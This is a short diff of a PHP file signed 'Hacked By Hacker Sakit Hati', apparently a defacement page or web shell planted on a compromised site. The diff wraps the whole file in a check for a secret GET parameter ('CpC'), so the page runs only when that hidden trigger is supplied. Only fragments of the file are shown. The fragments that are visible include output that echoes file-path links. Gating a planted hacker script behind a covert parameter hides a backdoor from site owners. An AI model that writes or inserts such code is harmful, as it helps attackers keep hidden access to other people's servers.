@@ -1,4 +1,6 @@
- <?php
+ <?php 
+if ( isset($_GET['CpC']) )
+{
 /**
 					Hacked By Hacker Sakit Hati
 
@@ -164,6 +166,5 @@ echo "<a href='?y&#61;$path' target='_blank' style='font-weight:bold; color:#;'>
 }
 echo "<br>";
 echo '</center></body></html>';
-
-}
+	}
 ?>
